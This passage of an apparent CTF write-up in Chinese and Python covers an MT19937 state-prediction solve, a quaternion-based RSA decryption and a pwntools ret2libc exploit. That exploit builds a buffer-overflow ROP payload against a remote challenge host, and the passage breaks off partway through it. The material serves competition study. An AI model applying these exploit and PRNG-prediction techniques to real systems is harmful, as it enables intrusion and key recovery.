3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nRNG1<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>G<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">from</span> extend_mt19937_predictor <span class=\"token keyword\">import</span> ExtendMT19937Predictor\n\npredictor <span class=\"token operator\">=</span> ExtendMT19937Predictor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    predictor<span class=\"token punctuation\">.</span>setrandbits<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    predictor<span class=\"token punctuation\">.</span>backtrack_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    \nkey<span class=\"token operator\">=</span>predictor<span class=\"token punctuation\">.</span>backtrack_getrandbits<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>e<span class=\"token operator\">^</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><em><strong>0h_51mple_r@nd0m</strong></em></p>\n<h3 id=\"复复复复数\"><a href=\"#复复复复数\" class=\"headerlink\" title=\"复复复复数\"></a>复复复复数</h3><p>四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r</p>\n<p>但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">ComComplex</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> value<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span>i <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n                s <span class=\"token operator\">+=</span> <span class=\"token string\">'+'</span>\n            s <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'ijk'</span><span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> s\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__add__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span>j <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span>j <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mul__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        a <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n        b <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n        c <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n        d <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mod__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> x <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__pow__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> n<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        tmp <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">while</span> x<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> x <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                a <span class=\"token operator\">*=</span> tmp\n            tmp <span class=\"token operator\">*=</span> tmp\n            <span class=\"token keyword\">if</span> n<span class=\"token punctuation\">:</span>\n                a <span class=\"token operator\">%=</span> n\n                tmp <span class=\"token operator\">%=</span> n\n            x <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">return</span> a\n        \n    <span class=\"token keyword\">def</span> <span class=\"token function\">inv</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        inv_len<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nhints <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">375413371936</span><span class=\"token punctuation\">,</span><span class=\"token number\">452903063925</span><span class=\"token punctuation\">,</span><span class=\"token number\">418564633198</span><span class=\"token punctuation\">,</span><span class=\"token number\">452841062207</span><span class=\"token punctuation\">]</span>\ngift <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span><span class=\"token punctuation\">,</span><span class=\"token number\">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span><span class=\"token punctuation\">,</span><span class=\"token number\">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span><span class=\"token punctuation\">,</span><span class=\"token number\">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span><span class=\"token punctuation\">]</span>\nP <span class=\"token operator\">=</span> <span class=\"token number\">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span>\nc <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span><span class=\"token punctuation\">,</span><span class=\"token number\">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span><span class=\"token punctuation\">,</span><span class=\"token number\">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span><span class=\"token punctuation\">,</span><span class=\"token number\">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65547</span>\n\ninv<span class=\"token operator\">=</span>ComComplex<span class=\"token punctuation\">.</span>inv<span class=\"token punctuation\">(</span>hints<span class=\"token punctuation\">,</span>P<span class=\"token punctuation\">)</span>\ngifts<span class=\"token operator\">=</span>ComComplex<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span>\nkeys<span class=\"token operator\">=</span>inv<span class=\"token operator\">*</span>gifts<span class=\"token operator\">%</span>P\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span>\n\n_<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>r<span class=\"token operator\">=</span>keys<span class=\"token punctuation\">.</span>value\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token operator\">*</span>r<span class=\"token operator\">-</span>n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>r<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nd<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">**</span><span class=\"token number\">4</span><span class=\"token operator\">-</span>q<span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token operator\">-</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>q<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nm<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n\n<p>flag{Quaternion_15_ComComComComplexXXX!!!?}</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"Ret2libc’s-Revenge\"><a href=\"#Ret2libc’s-Revenge\" class=\"headerlink\" title=\"Ret2libc’s Revenge\"></a>Ret2libc’s Revenge</h3><p>溢出可以写负数来改返回地址，之后ret2libc就行</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"DEBUG\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.93.96.189\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36879</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#debug(\"break *0x40127A\")</span>\n<span class=\"token comment\">#debug()</span>\n\n<span class=\"token comment\">#target=0x404000-0x20</span>\ntarget<span class=\"token operator\">=</span><span class=\"token number\">0x4005b0</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">-</span><span class=\"token number\">0x20</span>\nrbp<span class=\"token operator\">=</span><span class=\"token number\">0x040117d</span>\nrsi_0<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004010e4</span>\nadd_rsi<span class=\"token operator\">=</span><span class=\"token number\">0x04010eb</span>\nputs<span class=\"token operator\">=</span><span class=\"token number\">0x404018</span>\nrdi_rsi<span class=\"token operator\">=</span><span class=\"token number\">0x0401180</span>\nplt<span class=\"token operator\">=</span><span class=\"token number\">0x0401070</span>\nmain<span class=\"token operator\">=</span><span class=\"token number\">0x40127B</span>\nret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004012a9</span>\n\nnum<span class=\"token operator\">=</span><span class=\"token number\">0xffffffff</span><span class=\"token operator\">-</span><span class=\"token number\">0x12</span><span class=\"token operator\">-</span><span class=\"token number\">0xc8</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">528</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi_0<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>add_rsi<span class=\"token punctuation\">)</span>\np<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi_rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tsl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token 